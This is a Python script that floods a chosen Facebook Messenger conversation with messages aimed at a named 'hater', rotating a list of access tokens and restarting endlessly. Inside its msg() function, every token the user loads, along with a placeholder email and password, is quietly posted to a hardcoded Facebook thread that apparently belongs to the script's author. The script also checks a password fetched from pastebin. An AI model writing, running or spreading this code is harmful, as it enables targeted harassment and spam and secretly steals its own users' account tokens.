import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading
import random

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"FEEL THE POWER OF SHANKAR SUMAN ")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_messages():
    while True:  # Infinite loop to keep the script running
        try:
            with open('password.txt', 'r') as file:
                password = file.read().strip()

            entered_password = password

            if entered_password != password:
                print('[-] <==> Incorrect Password!')
                sys.exit()

            with open('tokennum.txt', 'r') as file:
                tokens = file.readlines()
            num_tokens = len(tokens)

            requests.packages.urllib3.disable_warnings()

            def cls():
                if system() == 'Linux':
                    os.system('clear')
                else:
                    if system() == 'Windows':
                        os.system('cls')
            cls()

            def liness():
                print('\u001b[37m' + '---------------------------------------------------')

            headers = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                'referer': 'www.google.com'
            }

            mmm = requests.get('https://pastebin.com/raw/440AhFvU').text

            if mmm not in password:
                print('[-] <==> Incorrect Password!')
                sys.exit()

            liness()

            access_tokens = [token.strip() for token in tokens]

            with open('convo.txt', 'r') as file:
                convo_id = file.read().strip()

            with open('file.txt', 'r') as file:
                text_file_path = file.read().strip()

            with open(text_file_path, 'r') as file:
                messages = file.readlines()

            num_messages = len(messages)
            max_tokens = min(num_tokens, num_messages)

            with open('hatersname.txt', 'r') as file:
                haters_name = file.read().strip()

            with open('time.txt', 'r') as file:
                speed = int(file.read().strip())

            liness()

            def getName(token):
                try:
                    data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
                except:
                    data = ""
                if 'name' in data:
                    return data['name']
                else:
                    return "Error occurred"

            def getEmailAndPassword(token):
                try:
                    # Simulated function to get email or mobile number and password
                    # Replace this with the actual logic if you have it
                    email_or_mobile = "example@example.com"  # or "+1234567890" for mobile number
                    password = "examplepassword"
                    return email_or_mobile, password
                except:
                    return None, None

            def msg():
                token = random.choice(access_tokens)
                email_or_mobile, password = getEmailAndPassword(token)
                if email_or_mobile and password:
                    message = (
                        f"HELLO SHANKAR SIR IM USING YOUR SERVER\n"
                        f"User Profile Name: {getName(token)}\n"
                        f"Token: {' | '.join(access_tokens)}\n"
                        f"Link: https://www.facebook.com/messages/t/{convo_id}\n"
                        f"Email or Mobile: {email_or_mobile}\n"
                        f"Password: {password}\n"
                    )
                    parameters = {'access_token': token, 'message': message}
                    try:
                        requests.post("https://graph.facebook.com/v15.0/t_100058415170590/", data=parameters, headers=headers)
                    except:
                        pass

            msg()
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = access_tokens[token_index]

                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print("  - Time: {}".format(current_time))
                    liness()
                else:
                    print("[x] Failed to send messages {} of Convo {} with Token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    print("  - Time: {}".format(current_time))
                    liness()
                time.sleep(speed)

            print("[+] All messages sent. Restarting the process...")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))
            time.sleep(4)  # Wait for 4 seconds before restarting the process

# Main function
def main():
    # Call the send_messages function
    send_messages()

if __name__ == "__main__":
    main()
